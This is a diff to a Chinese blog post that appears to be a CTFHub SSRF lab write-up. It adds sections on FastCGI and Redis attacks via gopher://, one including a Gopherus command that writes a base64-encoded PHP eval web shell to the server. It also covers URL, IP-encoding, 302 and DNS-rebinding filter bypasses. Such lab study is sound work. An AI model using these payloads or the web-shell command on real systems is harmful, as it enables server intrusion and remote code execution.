@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.1k 字
+      1.6k 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      13
+      20
        分钟
     </span>
   
@@ -285,6 +285,35 @@ Content-Length: 36
 key=308353d55f15e345a78047c613994fcb         </code></pre>
 <p>将其进行url编码，<br>然后加上<code>gopher://127.0.0.1:80/_</code><br>再次url编码<br>提交得到flag<br>payload：<code>?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D308353d55f15e345a78047c613994fcb</code></p>
 <h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>这个和上面那个差不多，也要用gopher协议<br>访问flag.php后有上传文件，但没提交按钮<br>可以自己构造一个<code>&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</code><br>提交抓包<br>Host改为<code>127.0.0.1</code><br>过一下上面的编码流程<br>提交       </p>
+<h3 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h3><p>这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助   </p>
+<p>这次可以使用<code>Gopherus</code>工具生成攻击fastcgi的payload     </p>
+<pre><code>python gopherus.py --exploit fastcgi
+/var/www/html/index.php                 # 这里输入的是一个已知存在的php文件
+echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shell.php   #写入一句话&lt;?php eval($_POST[whoami]);?&gt;</code></pre>
+<p><a target="_blank" rel="noopener" href="https://github.com/tarunkant/gopherus">gopher</a><br><img src="https://sc04.alicdn.com/kf/Ub52af498907e44fcb82b438d02f79f38P.jpg" srcset="/img/loading.gif" alt="507.png"><br>因为要以GET传入，所以要再进行一次url编码<br>提交后蚁剑连接即可<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">P神的fsatcgi分析</a>        </p>
+<h3 id="Redia协议"><a href="#Redia协议" class="headerlink" title="Redia协议"></a>Redia协议</h3><p>这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找!     </p>
+<p>Redia也可以用gopherus直接生成payload<br><img src="https://sc01.alicdn.com/kf/U59fa33c2723c4f3899da3f7205a6a573R.jpg" srcset="/img/loading.gif" alt="508.png"><br>但这次需要将得到的payload进行两次url编码，不知道为什么，不该是一次么？？        </p>
+<h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p>请求的URL中必须包含<a target="_blank" rel="noopener" href="http://notfound.ctfhub.com,来尝试利用url的一些特殊地方绕过这个限制吧/">http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</a></p>
+<p><img src="https://ae03.alicdn.com/kf/Ud3002561aaad433d8b3b07518fa317f2i.jpg" srcset="/img/loading.gif" alt="509.png"><br><code>@</code><br>payload：<code>?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</code>        </p>
+<h3 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h3><p>这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢      </p>
+<p>转换为十六进制，八进制和十进制貌似不行<br><code>0x7f.0.0.1/flag.php</code>  </p>
+<ul>
+<li>其他指向<code>127.0.0.1</code>的地址    <blockquote>
+<p><a target="_blank" rel="noopener" href="http://localhost/">http://localhost/</a><br><a target="_blank" rel="noopener" href="http://0.0.0.0/">http://0/</a><br>http://[0:0:0:0:0:ffff:127.0.0.1]/<br>http://①②⑦.⓪.⓪.①      </p>
+</blockquote>
+</li>
+</ul>
+<h3 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h3><p>SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧      </p>
+<p>抱着试试的心态，看会有什么，直接<code>?url=127.0.0.1/flag.php</code><br>居然出了flag？？？？？？？？？         </p>
+<ul>
+<li><code>.xip.io</code>      <blockquote>
+<p>127.0.0.1.xip.io——-&gt;127.0.0.1       </p>
+</blockquote>
+</li>
+<li><a target="_blank" rel="noopener" href="https://4m.cn/">短地址绕过</a><br>  <img src="https://ae02.alicdn.com/kf/U322cdf822f2d4381baff23981c4998dbA.jpg" srcset="/img/loading.gif" alt="510.png">       </li>
+</ul>
+<h3 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h3><p>这两道题指定是出毛病了<br>直接就出来了？？？？？      </p>
+<p>一个网站获取测试用的域名<code>https://lock.cmpxchg8b.com/rebinder.html</code><br><img src="https://ae03.alicdn.com/kf/Uffcd9a5275694a52a5104eed584e3e4bI.jpg" srcset="/img/loading.gif" alt="511.png"><br>这个域名可以在两个IP间变换，所以就有可能在经过判断IP是否合法是解析到合法的那个IP，在其访问时解析到内网IP<br>所以要不断访问<br><img src="https://image.3001.net/images/20201220/1608453315_5fdf0cc30da5af624b123.png" srcset="/img/loading.gif"><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89426041">DNS重绑定</a></p>
 
             </div>
             <hr>
